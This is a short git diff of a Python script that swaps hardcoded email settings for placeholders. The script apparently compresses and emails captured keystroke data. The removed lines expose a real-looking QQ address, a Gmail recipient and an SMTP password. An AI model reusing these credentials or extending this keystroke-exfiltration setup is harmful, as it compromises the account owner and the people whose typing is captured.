@@ -14,11 +14,10 @@ from email import encoders
 from datetime import datetime
 
 # 发件人和收件人信息
-from_addr = "309213748@qq.com"
-to_addr = "250218lxl@gmail.com"
-password = "ctosmtowufllcaeg"
-
-compressed_file = "D:\\compressed_key_data.bin"
+from_addr = "your_email@example.com"
+to_addr = "recipient_email@example.com"
+password = "your_email_password_or_smtp_token"
+compressed_file = "D:\\key_data.bin"
 
 key_encoding = {
     # 字母键
